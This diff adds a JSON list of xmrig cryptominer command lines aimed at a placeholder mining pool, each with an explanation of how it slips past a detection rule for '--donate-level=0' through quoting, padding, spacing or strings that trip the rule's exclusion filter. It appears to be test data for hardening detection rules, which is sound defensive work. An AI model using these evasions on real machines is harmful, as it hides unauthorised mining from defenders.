@@ -1,0 +1,18 @@
+[
+  {
+    "output": "xmrig.exe -o pool.example.com:3333 -u wallet --donate-level 0",
+    "explanation": "Substitution technique: Replaced the long option double hyphen syntax ('--donate-level=0') with a standard space-separated alternative option value form ('--donate-level 0'). Standard parsing frameworks natively decouple assignments separated by whitespace or an equals sign, but this mutation effectively avoids the literal string requirement looking for '--donate-level=0'."
+  },
+  {
+    "output": "xmrig.exe \"-o\" pool.example.com:3333 -u wallet --donate-level=0 gcc -o pool.o src/pool.c",
+    "explanation": "Other techniques / Exclusion trigger: Appended benign compiler string keywords ('gcc -o pool.o src/pool.c') onto the trailing parameter list of the test execution line. The application ignores trailing unrelated code statements that do not map to option flags, but the presence of these substrings triggers the rule's explicit exclusion filter 'not 1 of filter_optional_*', cancelling out the alert."
+  },
+  {
+    "output": "xmrig.exe \"--donate-level=0\" -o pool.example.com:3333 -u wallet",
+    "explanation": "Insertion technique: Wrapped the continuous argument option switch '--donate-level=0' entirely in double quotes. The mining application's argument translation stack natively eliminates outer quotes during execution vector creation, but this modification breaks the continuous unquoted lookups configured on fragile string signature engines."
+  },
+  {
+    "output": "xmrig.exe --donate-level=00 -o pool.example.com:3333 -u wallet",
+    "explanation": "Recoding technique: Padded the numeric integer configuration assignment with a leading zero block ('=00' instead of '=0'). The application logic normalizes and interprets '00' as a valid numeric configuration setting of zero percent donation, while successfully breaking the rule's strict match lookups for '--donate-level=0'."
+  }
+]
